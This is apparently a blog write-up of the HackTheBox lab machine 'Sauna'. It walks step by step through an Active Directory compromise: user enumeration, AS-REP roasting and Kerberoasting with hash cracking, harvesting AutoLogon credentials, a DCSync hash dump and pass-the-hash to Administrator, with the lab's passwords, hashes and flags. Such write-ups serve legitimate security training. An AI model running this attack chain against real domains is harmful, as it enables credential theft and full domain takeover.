---
title: "Sauna"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Sauna

![](assets/Pasted%20image%2020250510162317.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 13:28 CET
Nmap scan report for 10.10.10.175
Host is up (0.044s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-19 20:25:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h55m06s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-19T20:25:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.28 seconds
```

Add the domain to `/etc/hosts`.

I can't see shares or enter a null session, so let's explore the web.

There is an about page with the people of the company. We can make a user list with the names.

![](assets/Pasted%20image%2020241119163350.png)

```bash
fergus.smith
fsmith
hugo.bear
hbear
steven.kerb
s.kerb
shaun.coins
scoins
bowie.taylor
btaylor
sophie.driver
sdriver
```

Use `kerbrute` to find a valid user.

```bash
$ ./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 ../users 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/19/24 - Ronnie Flathers @ropnop

2024/11/19 16:31:18 >  Using KDC(s):
2024/11/19 16:31:18 >   10.10.10.175:88

2024/11/19 16:31:18 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2024/11/19 16:31:18 >  Done! Tested 12 usernames (1 valid) in 0.090 seconds
```

And we have `fsmith`, now the password.

We can try an ASREPRoasting with the user and blank password.

```bash
$ impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request -format hashcat 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3b42a42d498068caa61e71f24e9a10baab05ed637f5614982ca716074ab86250b4d243d612b005336fa0beb107460bb9b6aafe7fdc7570763fe2df40892031e965374323b4ffd8280f66adf236b62038c8ba0854c62e7716b70b3ded34ad0e70e2ee9383e43e9446e78af6bed5d2aa2318b3d4812da24999ad598cb6f304682027b6b5d330c50cea07c1c76caab71354cc696824e5be0cac5997291f479e0211de4a8a7059997f6535af2871b4e24c719b38f6b4ee365731d0112b8336409275c15410a1d8164e030578f62dacac1d127cb608f575960d14648c778f230ed626569c829b9ddbe44c1796b405f6932f82975d9219d6d8cc93e552d4966ac3e0
```

Using `hashcat` we get the password `'fsmith:Thestrokes23'`.

```bash
$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

...

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3b42a42d498068caa61e71f24e9a10baab05ed637f5614982ca716074ab86250b4d243d612b005336fa0beb107460bb9b6aafe7fdc7570763fe2df40892031e965374323b4ffd8280f66adf236b62038c8ba0854c62e7716b70b3ded34ad0e70e2ee9383e43e9446e78af6bed5d2aa2318b3d4812da24999ad598cb6f304682027b6b5d330c50cea07c1c76caab71354cc696824e5be0cac5997291f479e0211de4a8a7059997f6535af2871b4e24c719b38f6b4ee365731d0112b8336409275c15410a1d8164e030578f62dacac1d127cb608f575960d14648c778f230ed626569c829b9ddbe44c1796b405f6932f82975d9219d6d8cc93e552d4966ac3e0:Thestrokes23
```

## Initial Access

```bash
$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
 
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
95c08876d46d462d064c1471e6a83c36
```

## Privilege Escalation

We can do a Kerberoasting attack.

```bash
$ faketime '2024-11-20 02:56:20' impacket-GetUserSPNs -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 06:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cbd0dcbac2c6e3f3899f956a5b6f8b4c$5a8e6d538b92edf6f6b887a6986ad2642974f7382f5b837c4b7742f12172494b2fda446f09f52c9773b7b1098315449f56304cfe105a7608d741099f4331dd429501fd65d6619be631d616cdad252226a05a571cdbe92640a42c3b8d71fbf0878efed69d9e73e1b6acf37f4adcb1aa64fa8e2f03f86f1a120a428ea2806c7af7e33a8d31d6418fe52a93c5bc890d184b1e21b68aa4f86bcf1669c2435334facde53bef3d95f43289938b2475e7b803f003330f6b429e2b302e1d67e01086c2789f3ec08c72456681501a668269fea97c7a0d570ccf5de263739a7444ef3da2a266a3c5a32ec5c014e2a99807ae532a49a7e6cde16a07a069f30f3452aa4b320d85e82e9cd114a24bc9294036702919733cf5faeebe3a35fdac4a5fa4a26216e0aeb915fc9611b17e10e09849da3d6987ace1f85b940da6e7b16c5fee8b21446e6eebc70d2df7a893deb3c93dc8fb8d7088231d9e46cc8b15edce979aa57fa30d2cbbd50a917acb7c69644359ab1555d7336d892342a051250698fdfd3d752f243f1c4081919683f91d0a879fe57416b3cb7e01aef903ea6e91f589f26c2bfd74d6316e630dcd110378e65d3b6f8418a1c4236bc2ebbf14f11364f92e53e04e95c36a4fa7a96d4b77dbe5829e6faa4290b4a2dde7e0b4b70f98357956948650025edb92affce37f92979171a88c79de9934f76244463b029358276b5ff58f06a3bb0ce826bc55ccbd09a093d72cff502312a6f10b4a44316e6947b029d5a8ef62edbe5087f99bfd45ec98357685169957a119b48238321996fcb6d56fa0b227e0221fe9812d5c9f3967a34259ff840fbd3587e7f52de9bd7220df2bad1bf629a5127958f043323bd962976636a8f14337328296605e9bf65ed68becad7a3eb48ead1a113677f37794d1c71a0fdf181df9afc9422209cf540c3055f5262993af1cae4cd0170c2de637bbab4f1c876f8ab9cd562148ab4ebb1692be3dbcb39aaa8f902655df9eb559ac32230c06829ceb3d8544895f2fc5f5974dec9e7477df3af1568ab82416eab8f6d015b591a4cfff04423739aea8a4381bdd79f8b0ab220fc49e6bbb9d88e1c6f99480db85d8384efc253f0196bf7fe0cfe27ef3f02770afe204d322c6398c55c0f9038392beb6ac333e7b8642b9cc4653de6fed3239e157382bad41b8a13af103aa91770d13d13aef0f5286e9575137466ec478042202803a3edb01d3a110d7ef5b1a0a5825f6c1289a4579e1282c640835ebccdbebdfbef7d458523ba9af5616df9459549db001e6e67fd8ecadb4b30b5b47100bf64682fd8ab6da41dee98557e21d50d158be69ee20cfd7a54d4467ce30198bf0e504211640774f9ea2493709b025184586efa3f09b04e8bb67713dcb5a242ec656544c05dd7ff73f83
```

There is a user that can be Kerberoasted named `HSmith`, let's use `hashcat`.

```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt   
hashcat (v6.2.6) starting


$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cbd0dcbac2c6e3f3899f956a5b6f8b4c$5a8e6d538b92edf6f6b887a6986ad2642974f7382f5b837c4b7742f12172494b2fda446f09f52c9773b7b1098315449f56304cfe105a7608d741099f4331dd429501fd65d6619be631d616cdad252226a05a571cdbe92640a42c3b8d71fbf0878efed69d9e73e1b6acf37f4adcb1aa64fa8e2f03f86f1a120a428ea2806c7af7e33a8d31d6418fe52a93c5bc890d184b1e21b68aa4f86bcf1669c2435334facde53bef3d95f43289938b2475e7b803f003330f6b429e2b302e1d67e01086c2789f3ec08c72456681501a668269fea97c7a0d570ccf5de263739a7444ef3da2a266a3c5a32ec5c014e2a99807ae532a49a7e6cde16a07a069f30f3452aa4b320d85e82e9cd114a24bc9294036702919733cf5faeebe3a35fdac4a5fa4a26216e0aeb915fc9611b17e10e09849da3d6987ace1f85b940da6e7b16c5fee8b21446e6eebc70d2df7a893deb3c93dc8fb8d7088231d9e46cc8b15edce979aa57fa30d2cbbd50a917acb7c69644359ab1555d7336d892342a051250698fdfd3d752f243f1c4081919683f91d0a879fe57416b3cb7e01aef903ea6e91f589f26c2bfd74d6316e630dcd110378e65d3b6f8418a1c4236bc2ebbf14f11364f92e53e04e95c36a4fa7a96d4b77dbe5829e6faa4290b4a2dde7e0b4b70f98357956948650025edb92affce37f92979171a88c79de9934f76244463b029358276b5ff58f06a3bb0ce826bc55ccbd09a093d72cff502312a6f10b4a44316e6947b029d5a8ef62edbe5087f99bfd45ec98357685169957a119b48238321996fcb6d56fa0b227e0221fe9812d5c9f3967a34259ff840fbd3587e7f52de9bd7220df2bad1bf629a5127958f043323bd962976636a8f14337328296605e9bf65ed68becad7a3eb48ead1a113677f37794d1c71a0fdf181df9afc9422209cf540c3055f5262993af1cae4cd0170c2de637bbab4f1c876f8ab9cd562148ab4ebb1692be3dbcb39aaa8f902655df9eb559ac32230c06829ceb3d8544895f2fc5f5974dec9e7477df3af1568ab82416eab8f6d015b591a4cfff04423739aea8a4381bdd79f8b0ab220fc49e6bbb9d88e1c6f99480db85d8384efc253f0196bf7fe0cfe27ef3f02770afe204d322c6398c55c0f9038392beb6ac333e7b8642b9cc4653de6fed3239e157382bad41b8a13af103aa91770d13d13aef0f5286e9575137466ec478042202803a3edb01d3a110d7ef5b1a0a5825f6c1289a4579e1282c640835ebccdbebdfbef7d458523ba9af5616df9459549db001e6e67fd8ecadb4b30b5b47100bf64682fd8ab6da41dee98557e21d50d158be69ee20cfd7a54d4467ce30198bf0e504211640774f9ea2493709b025184586efa3f09b04e8bb67713dcb5a242ec656544c05dd7ff73f83:Thestrokes23
```

And we have `hsmith:Thestrokes23`, same password as fsmith.

This user is a rabbit hole. Let's continue with `fsmith`.

Upload `sharphound` and run `sh.exe -c All` and upload to `bloodhound`.

![](assets/Pasted%20image%2020241119203832.png)

Running `winpeas` we find:

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

`Bloodhound` tells us that this user can DCSync the domain, so get hashes via `secretsdump`.

![](assets/Pasted%20image%2020241120092725.png)

```bash
$ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
...
[*] Cleaning up... 
```

We have the `administrator` hash, we can use `evil-winrm` with PTH.

```bash
$ evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
                                        
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Post Exploitation

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
bdd3353dd85a13d8be0c9c5d023ac706
```
